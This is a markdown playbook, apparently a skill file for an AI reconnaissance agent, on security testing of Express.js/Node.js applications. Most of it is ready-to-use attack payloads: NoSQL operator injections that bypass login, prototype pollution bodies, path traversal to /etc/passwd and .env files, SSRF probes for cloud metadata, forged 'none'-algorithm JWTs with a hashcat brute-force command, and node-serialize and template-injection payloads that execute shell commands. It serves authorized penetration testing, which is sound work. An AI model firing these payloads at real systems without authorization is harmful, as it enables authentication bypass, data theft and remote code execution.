<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: express
description: Security testing playbook for Express.js/Node.js applications covering prototype pollution, SSRF, regex DoS, JWT misuse, path traversal, and Node.js-specific misconfigurations
---

# Express.js / Node.js Security Testing

Express is the most popular Node.js web framework. Attack surface: prototype pollution, path traversal via `__proto__`, JWT misconfigurations, NoSQL injection (MongoDB), SSRF, regex DoS (ReDoS), and common npm package vulnerabilities.

---

## Reconnaissance

### Fingerprinting Express/Node.js

    # Express-specific headers and responses
    X-Powered-By: Express          # Default header (often left enabled)
    ETag: W/"..."                  # Weak ETag = Express default

    # Common Node.js paths
    GET /health                    # Health check
    GET /status
    GET /ping
    GET /metrics                   # Prometheus (if prom-client used)
    GET /api-docs                  # Swagger UI
    GET /swagger.json
    GET /openapi.json
    GET /.well-known/              # OIDC discovery, security.txt

    # Node.js error page
    GET /nonexistent → "Cannot GET /nonexistent" → confirms Express

    # Package.json / config exposure
    GET /package.json              # Node packages + version info
    GET /package-lock.json
    GET /.env
    GET /config.js
    GET /config.json

---

## Prototype Pollution

Node.js/Express apps using `merge`, `extend`, `lodash.merge`, or JSON path setting are vulnerable:

    # Test: inject __proto__ or constructor.prototype into JSON body
    POST /api/endpoint
    Content-Type: application/json
    {"__proto__": {"admin": true}}

    {"constructor": {"prototype": {"admin": true}}}

    # URL parameter pollution
    GET /api/user?__proto__[admin]=true
    GET /api/user?constructor[prototype][admin]=true

    # Nested merge vulnerability
    POST /api/settings
    {"settings": {"__proto__": {"polluted": "yes"}}}

    # Validation: after sending, check if app-wide default has changed:
    GET /api/any-endpoint  → check if "admin": true appears in response

    # Libraries vulnerable to prototype pollution:
    # lodash < 4.17.11 (_.merge, _.mergeWith, _.defaultsDeep)
    # jquery < 3.4.0 ($.extend)
    # hoek < 4.2.1 / < 5.0.3

---

## NoSQL Injection (MongoDB / Mongoose)

    # MongoDB operator injection in JSON body:
    POST /api/login
    Content-Type: application/json
    {"username": {"$gt": ""}, "password": {"$gt": ""}}    # Bypass auth

    # Ne (not equal) operator:
    {"username": "admin", "password": {"$ne": "wrong"}}

    # Regex matching all users:
    {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}

    # In array bypass:
    {"username": {"$in": ["admin", "user"]}, "password": {"$gt": ""}}

    # URL-encoded (query string injection):
    GET /api/users?username[$gt]=&password[$gt]=

    # Enumeration via $regex:
    {"username": "admin", "password": {"$regex": "^a"}}    # Binary search on password

---

## Path Traversal

    # Express static file serving — test path traversal
    GET /static/../.env
    GET /static/../../config.js
    GET /public/../../../etc/passwd

    # URL-encoded:
    GET /files/..%2F..%2Fetc%2Fpasswd
    GET /files/%2e%2e%2f%2e%2e%2fetc%2fpasswd

    # Double encoding:
    GET /files/..%252F..%252Fetc%252Fpasswd

    # Null byte (older Node.js versions):
    GET /files/../../etc/passwd%00.png

---

## SSRF

    # Node.js HTTP libraries (axios, node-fetch, got, request):
    # Test any URL-accepting parameter

    # Probe internal services:
    http://localhost:3000/internal
    http://127.0.0.1/admin
    http://169.254.169.254/latest/meta-data/   # AWS IMDS
    http://metadata.google.internal/           # GCP metadata
    http://0.0.0.0/                            # All interfaces

    # Protocol handlers in Node.js:
    file:///etc/passwd
    dict://localhost:6379/info                  # Redis
    gopher://localhost:6379/...                 # Redis commands via gopher

    # DNS rebinding via custom domain:
    http://attacker-rebinding.domain/

---

## JWT Misconfigurations

    # Algorithm confusion: none algorithm
    # Forge JWT with algorithm=none:
    {"alg": "none", "typ": "JWT"}.{"sub": "1", "role": "admin"}.

    # RS256 → HS256 confusion:
    # Sign JWT with server's public key as HMAC secret
    # Works when server uses jsonwebtoken with algorithm not pinned

    # Key ID (kid) injection:
    # JWT header: {"alg": "HS256", "kid": "../../etc/passwd"}
    # Server reads key from file path = LFI via JWT

    # Weak secret brute force:
    hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt
    python3 -c "import jwt; print(jwt.decode('<token>', 'secret', algorithms=['HS256']))"

    # Missing expiry check:
    # Use old expired JWT — check if server still accepts it

---

## ReDoS (Regex Denial of Service)

    # Catastrophic backtracking in vulnerable regex patterns
    # Find: email validation, username validation, URL parsing

    # Classic ReDoS payload (for patterns like /(a+)+$/ ):
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
    "aaaaaaaaaaaaaaaaaaaaaaaaaaa@"

    # Email validation ReDoS:
    "aaaaaaaaaaaaaaaaaaaaaaaaaaaa@aaaaaaaaaaaaaaaaaaaaaaaaaaaa"

    # Test: send payload and measure response time
    time curl -X POST <target>/api/register -d '{"email": "aaaa[...]@aaaa[...].com"}'

---

## Deserialization (node-serialize)

    # node-serialize npm package (vulnerable)
    # Payload uses IIFE notation:
    {"rce": "_$$ND_FUNC$$_function(){require('child_process').exec('id', function(err, stdout){console.log(stdout)})}()"}

    # Base64-encode and set as cookie if node-serialize is used on cookies
    # Detect: cookie value starts with base64 of JSON with _$$ND_FUNC$$_

---

## Server-Side Template Injection

    # Express commonly uses: EJS, Pug (Jade), Handlebars, Nunjucks, Mustache

    # EJS SSTI:
    <%= 7*7 %>                              # Basic arithmetic
    <%= process.env %>                      # Dump environment
    <%- global.process.mainModule.require('child_process').execSync('id') %>  # RCE

    # Pug SSTI:
    #{7*7}                                  # Basic
    #{root.process.mainModule.require('child_process').execSync('id').toString()}

    # Handlebars SSTI:
    {{#with "s" as |string|}}
      {{#with "e"}}
        {{#with split as |conslist|}}
          {{this.pop}}
          {{this.push (lookup string.sub "constructor")}}
          {{this.pop}}
          {{#with string.split as |codelist|}}
            {{this.pop}}
            {{this.push "return require('child_process').execSync('id');"}}
            {{this.pop}}
            {{#each conslist}}
              {{#with (string.sub.apply 0 codelist)}}
                {{this}}
              {{/with}}
            {{/each}}
          {{/with}}
        {{/with}}
      {{/with}}
    {{/with}}

---

## Security Headers Analysis

    # Check security headers (often missing in Express apps)
    curl -I <target> | grep -iE "x-frame-options|content-security-policy|x-content-type|strict-transport|referrer-policy|permissions-policy"

    # Express common misconfigurations:
    # - Missing helmet.js (no security headers)
    # - cors({ origin: '*' }) — open CORS
    # - X-Powered-By: Express not removed

---

## Common Vulnerabilities by Package

| Package | Vulnerability |
|---------|--------------|
| `lodash < 4.17.21` | Prototype pollution |
| `express-fileupload` | Prototype pollution via files |
| `jsonwebtoken < 9.0` | Algorithm confusion |
| `node-serialize` | Deserialization RCE |
| `multer` | Path traversal in filename |
| `express-validator` | ReDoS in certain checks |
| `passport-jwt` | Missing algorithm pin |

    # Check npm packages:
    npm audit    # If access to package.json + node_modules

---

## Pro Tips

1. `X-Powered-By: Express` header confirms framework — always test prototype pollution first
2. NoSQL injection via `{"$gt": ""}` bypasses auth in >50% of Express+MongoDB apps
3. Prototype pollution often enables privilege escalation — `{"__proto__": {"admin": true}}`
4. JWT `algorithm: none` works surprisingly often in Express apps using old jsonwebtoken
5. Path traversal in Express static middleware with symlinks or encoded slashes
6. `cors({ origin: '*' })` + cookie-based auth = CSRF-equivalent credential theft
7. `package.json` exposure reveals exact package versions → targeted CVE search

## Summary

Express testing = prototype pollution (JSON body __proto__) + NoSQL injection ($gt operator) + JWT algorithm confusion + SSRF on URL parameters + SSTI if templates used. Prototype pollution is the most Express-specific finding — test every JSON-accepting endpoint with `{"__proto__": {"admin": true}}`. NoSQL injection in MongoDB is the other must-test: `{"password": {"$gt": ""}}` bypasses auth in unparameterized queries.
